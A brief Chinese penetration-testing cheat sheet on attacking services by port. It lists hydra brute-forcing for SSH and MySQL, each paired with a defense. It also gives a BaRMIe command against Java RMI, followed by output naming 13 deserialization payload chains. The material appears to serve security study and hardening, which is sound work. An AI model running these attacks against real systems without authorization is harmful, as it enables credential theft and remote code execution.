### 背景

由于被扫描主机的各种设置，具体端口号 与 端口提供的服务 不必然相关（如80通常为web端口 但不是必然)

### 思路

**Port -> Service -> Exp**

扫描全部端口 - 确定各端口服务 - 对每个服务尝试其对应的漏洞利用办法


### Services


|服务|常见端口|攻击工具/方式|防御/修复|
|:-------------:|--|-----|-----|
|SSH|22|hydra - 暴力枚举|基线检查 检查并修正不安全配置|
|MySQL|3306|hydra - 暴力枚举|基线检查 检查并修正不安全配置|


|服务|常见端口| 攻击工具/方式 | 防御/修复 |
|:-------------:|--|--|-----|
|RMI|1099|[BaRMIe](https://github.com/NickstaDB/BaRMIe) (Java) - enumerating and attacking Java RMI (Remote Method Invocation) services.|ACL|

```
#BaRMIe
java -jar BaRMIe_v1.01.jar -attack ip port
#可以只输入ip自动进行端口枚举
#支持13种payload
Deserialization payloads for: 10.0.0.1:1099
 1) Apache Commons Collections 3.1, 3.2, 3.2.1
 2) Apache Commons Collections 4.0-alpha1, 4.0
 3) Apache Groovy 1.7-beta-1 to 2.4.0-beta-4
 4) Apache Groovy 2.4.0-rc1 to 2.4.3
 5) JBoss Interceptors API
 6) ROME 0.5 to 1.0
 7) ROME 1.5 to 1.7.3
 8) Mozilla Rhino 1.7r2
 9) Mozilla Rhino 1.7r2 for Java 1.4
 10) Mozilla Rhino 1.7r3
 11) Mozilla Rhino 1.7r3 for Java 1.4
 12) Mozilla Rhino 1.7r4 and 1.7r5
 13) Mozilla Rhino 1.7r6, 1.7r7, and 1.7.7.1
 ```
